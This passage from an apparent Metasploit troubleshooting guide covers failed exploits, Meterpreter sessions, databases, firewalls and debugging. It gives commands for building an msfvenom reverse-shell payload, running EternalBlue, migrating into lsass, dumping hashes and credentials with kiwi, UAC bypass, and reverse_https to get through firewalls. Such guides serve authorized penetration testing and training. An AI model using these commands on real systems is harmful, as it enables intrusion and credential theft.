|"The target appears to be down"	|Target IP is wrong or target offline	|Double-check IP with ping|
|"This exploit is not supported on this platform"	|Wrong exploit for the OS	|Use search platform:windows to find compatible exploits|

- **Example: Verify target is up**
```bash
ping -c 3 192.168.1.10
```

- Example: Check if port is open
```bash
nc -zv 192.168.1.10 445
```


## 4. Meterpreter Issues
|Problem|	Likely Cause	|Solution|
|----|----|----|
|'getsystem' fails	|UAC blocking	|Use UAC bypass exploit first|
|'hashdump' fails|	Memory access denied	|Run getsystem first, or migrate to LSASS (migrate -P lsass.exe)|
|Session freezes or disconnects	|Network instability	|Use reverse_https which is more stable through firewalls|
|"Meterpreter is not in the correct session"|	Wrong session type|	Not all sessions are Meterpreter. Use sessions -l to see types|
|Can't upload/download files	|Path issues or permissions|Use full paths: upload /local/file C:\\Windows\\Temp\\|

- **Example: Migrate to a stable process**
```bash
meterpreter > ps | grep lsass
2528   lsass.exe
meterpreter > migrate 2528
[*] Migrating to 2528...
[*] Migration completed successfully
```

## 5. Database Issues
|Problem|	Likely Cause|	Solution|
|----|----|----|
|"Database not connected"	|PostgreSQL not running	|sudo systemctl start postgresql|
|"Cannot import scan"|	Wrong file format	|Use db_import -h to see supported formats|
|Workspace not saving	|Database disconnected	|db_connect before creating workspace|
|"Connection refused" on import|	File permissions	|chmod 644 scan.xml|

- **Example: Reconnect database**
  ```bash
  msf6 > db_connect
  msf6 > db_status
  [*] Connected to msf.
  ```
  
## 6. Module and Path Issues
|Problem	|Likely Cause	|Solution|
|----|-----|-----|
|"Module not found"	|Typo or wrong path|	Use search [keyword] to find correct path|
|"You have not set a payload"	|Payload not selected|	set payload windows/x64/meterpreter/reverse_tcp|
|"Invalid parameter"	|Wrong syntax|	Check show options for correct parameter names|

- **Example: Find a module by searching**
 ```bash
msf6 > search eternalblue
* Use the exact path from search results
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

## 7. Network and Firewall Issues
|Problem|	Likely Cause	|Solution|
|----|----|----|
|Payload won't connect from external network|	Firewall blocking inbound	|Use reverse_https (port 443) which is often open|
|Connection works, then drops	|Stateful firewall timing out|	Add pingback option to keep connection alive|
|Can't reach target|	Wrong subnet|	Check IP and netmask. Use ip route to verify routing|
|Target can't reach your listener	|NAT or firewall	|Use a VPS with public IP, or configure port forwarding|

- **Example: Check if your LHOST is correct**
```bash
 * From target (or test VM)
ping -c 3 192.168.1.5
nc -zv 192.168.1.5 4444
```


## 8. Common Error Messages
|Error|	Meaning	|Solution|
|Could not connect to database|	PostgreSQL not running|	sudo systemctl start postgresql|
|Command not found: [payload]	|Typo or wrong context|	You must be in use exploit/multi/handler before setting payload|
|Session 1 is not a Meterpreter session|	Wrong session type	|Some exploits give a shell, not Meterpreter. Use sessions -u 1 to upgrade|
|[-] Exploit aborted due to failure: no-target	|Target not set	|set RHOSTS [IP]|
|[-] Unable to proceed: No payload configured	|Payload not set	set |payload [path]|


## 9. Debugging Tips

- Enable verbose output:
  ```bash
  set VERBOSE true
  ```
- Enable full debugging:
  ```bash
  set DEBUG true
  ```
- Check logs:
  ```bash
  cat ~/.msf4/logs/framework.log | tail -50
  ```
- Test payload standalone:
  - Generate a test payload
    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o test.exe    
    ```
  - Start handler
    ```bash
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set LHOST 192.168.1.5
    set LPORT 4444
    run
    ```
  - Run test.exe on a test VM



## 10. Quick Troubleshooting Flowchart

- **1. Payload runs but no session?**
    ├── Check LHOST (is it your IP?)
    ├── Check LPORT (is your firewall blocking it?)
    ├── Check handler (is it running?)
    └── Check network (can target reach you?)

- **2. Exploit fails?**
    ├── Check RHOSTS (typo? correct target?)
    ├── Check RPORT (is service running?)
    ├── Check target type (`show targets`)
    ├── Check if target is patched
    └── Try `check` before `run`

- **3. Meterpreter fails?**
    ├── `getuid` -> check current user
    ├── `sysinfo` -> check OS and architecture
    ├── Migrate to a stable process
    ├── Use `getsystem` for privileges
    └── Load `kiwi` for credentials

- **4. Database not working?**
    ├── `sudo systemctl start postgresql`
    ├── `msfconsole -d`
    ├── `db_status`
    └── `workspace` to verify workspace


## Troubleshooting Cheat Sheet
|Problem	|Quick Fix|
|----|----|
|No session|	Check LHOST, LPORT, firewall|
|Database error	|sudo systemctl start postgresql|
|Module not found	|search [keyword]|
|Wrong payload|	show payloads|
|Target not vulnerable|	check, try different exploit|
|Session not Meterpreter|	sessions -u [ID] (upgrade)|
|getsystem fails|	Try UAC bypass first|
|hashdump fails|	load kiwi; creds_all|
|Connection drops	|Use reverse_https|

